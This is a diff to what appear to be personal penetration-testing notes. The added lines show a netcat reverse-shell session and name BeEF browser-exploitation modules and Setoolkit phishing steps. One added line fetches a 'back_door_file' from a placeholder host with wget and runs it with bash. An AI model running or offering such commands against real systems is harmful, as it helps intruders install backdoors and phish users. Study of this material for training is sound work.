@@ -934,6 +934,14 @@ hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 
 > nc -vv -l -p 8080
 >> id
+>> ls
+>> cd /tmp
+>> pwd
+>> curl
+>> wget http://ip_address/evil-files/back_door_file
+>> bash back_door_file
+>> ifconfig
+>> whoami
 
 "We use WebScrapBook to fake login page"
 
@@ -1164,9 +1172,17 @@ PARAM: commit=Sign+in
 
 BeEf
 ----
+"BeEf is Browser Exploitation framework"
+> beef-xss
 
+"Go command tab"
 
+"Find - alert, redirect, Clippy, Fake Notification Bar, Social Engineering"
 
+Indirect - Google Analytics - Setoolkit
+---------------------------------------
+- Go youtube page, view page source, take google analytic data
+- Open Setoolkit in Kali
 
 
 
